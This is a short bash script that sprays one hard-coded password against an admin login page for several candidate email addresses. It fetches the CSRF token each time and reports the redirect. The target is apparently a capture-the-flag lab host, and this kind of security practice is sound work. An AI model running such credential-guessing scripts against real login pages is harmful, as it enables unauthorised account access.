#!/bin/bash
HOST="billing.nexus.htb"
IP=10.129.12.96
PASS='N27xh!!2ucY04'

for EMAIL in "admin@nexus.htb" "jones@nexus.htb" "j.matthew@nexus.htb" "admin@example.com" "jones@krayin.com"; do
  JAR=$(mktemp)
  PAGE=$(curl -sS -c "$JAR" -H "Host: $HOST" "http://$IP/admin/login")
  TOKEN=$(echo "$PAGE" | grep -oE 'name="_token" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  RESP=$(curl -sS -i -c "$JAR" -b "$JAR" -H "Host: $HOST" \
    -X POST "http://$IP/admin/login" \
    --data-urlencode "_token=$TOKEN" \
    --data-urlencode "email=$EMAIL" \
    --data-urlencode "password=$PASS")
  LOC=$(echo "$RESP" | grep -i '^Location:')
  echo "EMAIL=$EMAIL -> $LOC"
  rm -f "$JAR"
done
